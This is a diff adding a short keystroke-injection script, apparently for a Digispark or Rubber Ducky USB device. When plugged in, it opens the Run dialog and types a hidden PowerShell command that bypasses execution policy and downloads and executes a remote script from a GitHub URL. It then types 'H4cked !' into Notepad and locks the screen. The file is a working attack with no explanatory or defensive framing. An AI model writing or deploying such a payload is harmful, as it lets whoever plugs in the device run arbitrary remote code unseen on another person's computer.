@@ -1,0 +1,15 @@
+GUI r
+DELAY 300
+STRING powershell.exe -exec bypass -w hidden -nop -c "iex(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/doyo4400/Digispark/main/wallpaper.ps1')"
+DELAY 200
+ENTER
+DELAY 1000
+GUI r
+DELAY 100
+STRING notepad
+DELAY 100
+ENTER
+DELAY 300
+STRING H4cked !
+DELAY 400
+GUI l
